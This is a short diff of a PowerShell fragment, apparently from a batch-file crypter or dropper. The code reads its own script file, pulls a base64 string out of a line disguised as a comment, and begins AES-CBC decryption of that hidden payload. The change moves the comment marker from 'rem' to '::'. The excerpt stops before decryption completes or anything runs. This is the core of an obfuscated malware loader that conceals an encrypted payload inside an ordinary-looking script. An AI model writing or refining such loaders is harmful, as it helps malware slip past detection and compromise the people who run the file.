@@ -1,5 +1,5 @@
 ﻿$contents_var = [System.IO.File]::ReadAllText('%~f0').Split([Environment]::NewLine);
-foreach ($line_var in $contents_var) { if ($line_var.Contains('rem')) {  $lastline_var = $line_var.Substring(4); break; }; };
+foreach ($line_var in $contents_var) { if ($line_var.StartsWith(':: ')) {  $lastline_var = $line_var.Substring(3); break; }; };
 $payload_var = [System.Convert]::FromBase64String($lastline_var);
 $aes_var = New-Object System.Security.Cryptography.AesManaged;
 $aes_var.Mode = [System.Security.Cryptography.CipherMode]::CBC;
